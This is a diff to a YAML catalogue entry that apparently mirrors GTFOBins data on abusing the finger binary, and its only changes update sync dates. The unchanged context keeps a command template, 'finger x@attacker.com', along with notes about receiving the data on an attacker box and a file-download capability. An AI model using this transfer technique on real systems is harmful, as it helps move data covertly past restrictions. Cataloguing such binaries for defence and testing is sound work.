@@ -13,7 +13,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-  last_synced: '2026-11-14'
+  last_synced: '2026-11-16'
 commands:
 - template: finger x@attacker.com
   comment: The command hangs waiting for the remote peer to close the socket.
@@ -51,7 +51,7 @@ source_data:
                 comment: A TCP server can be used on the attacker box to receive the data.
     upstream_url: https://gtfobins.github.io/gtfobins/finger/
     upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-    last_synced: '2026-11-14'
+    last_synced: '2026-11-16'
 enrichment:
   capabilities:
   - value: file-download
@@ -87,6 +87,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-11-14'
+  projected_at: '2026-11-16'
   source_hashes:
     GTFOBins: sha256:692fb1929c162670bf0d39ef544bc2590abbf4b4d1e41bc9da30ed403b23b147
